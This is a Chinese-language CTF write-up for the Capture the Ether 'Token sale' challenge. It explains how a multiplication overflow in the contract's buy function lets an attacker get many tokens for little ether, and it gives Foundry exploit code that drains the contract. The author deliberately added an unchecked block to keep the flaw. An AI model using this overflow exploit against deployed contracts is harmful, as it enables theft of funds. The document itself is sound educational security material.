# Token sale

## 题目描述

[原题链接](https://capturetheether.com/challenges/math/token-sale/)

原题目要求 TokenSaleChallenge 合约的 ether 余额小于 1 ether。参与过程分成两步，第一步使用 ether 购买 token，第二步卖出 token。

## 运行

**安装 Foundry**

根据 [Foundry 官方文档](https://getfoundry.sh/)配置好运行环境。

**运行测试**

```sh
$ cd WTF-CTF

$ forge test -C src/Capture_the_Ether/Math/Token_sale -vvv
```

## 功能简述

TokenSaleChallenge 里面 buy 和 sell 的 token 价格都相同，常规办法无法使得合约的 ether balance 降低。

在原题 `^0.4.21` 版本下，所有的算术操作都是 unchecked，因此为了能够复现这个 Challenge，我给 buy 里面的某一行增加了 unchecked。

解决思路是，我们设置一个 numtokens，使得 `numTokens * PRICE_PER_TOKEN` 向上溢出，这样我们就花费了少量的 ether 得到了大量的 token。

`UINT256_MAX / 1 ether + 1` 这个值相当于 UINT256_MAX 按照十进制右移 18 位再加 1。这样它乘以 1 ether 后肯定溢出，并且能够保证溢出后的数 val 小于 1 ether。

```solidity
        uint256 val;
        unchecked {
            val = (UINT256_MAX / 1 ether + 1) * 1 ether;
        }

        vm.startPrank(hacker);
        tokenSaleChallenge.buy{value: val}(UINT256_MAX / 1 ether + 1);

        emit log_named_uint("my new balance", hacker.balance);
        emit log_named_uint("tokenSaleChallenge balance", address(tokenSaleChallenge).balance);

        tokenSaleChallenge.sell(1);
        vm.stopPrank();
```